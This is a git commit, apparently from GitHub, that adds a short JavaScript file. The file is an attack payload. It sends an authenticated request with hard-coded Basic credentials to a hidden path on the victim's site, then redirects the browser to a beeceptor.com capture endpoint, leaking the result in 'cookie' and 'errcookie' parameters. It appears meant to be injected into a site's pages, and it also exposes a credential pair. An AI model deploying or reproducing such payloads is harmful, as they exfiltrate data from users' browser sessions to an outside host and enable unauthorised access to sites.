e9679f46f7b9448b671c53fc3a507496d9488a87
Oleg Esakov <73789889+TWTZptr@users.noreply.github.com>
2025-01-09 09:48:48 +0300

    Create fsdfssf324.js

---
+++ fsdfssf324.js
@@ -0,0 +1,9 @@
+(async () => {
+  let headers = new Headers();
+  headers.set('Authorization', 'Basic ' + btoa('dev_us' + ":" + 'valera_smeni_kredi_4mo'));
+  fetch('/oldsite/uvdundfngsunpeaeszsdfuipnuqeiweurnvp0etu9qrn0wu9eu0tn0ebu0fruas0dnfp0beqrbeu0afn ', {headers, redirect: 'manual'}).then(res => {
+    window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?cookie=' + res.status);
+  }).catch(err => {
+    window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?errcookie=' + JSON.stringify(err))
+  });
+})()
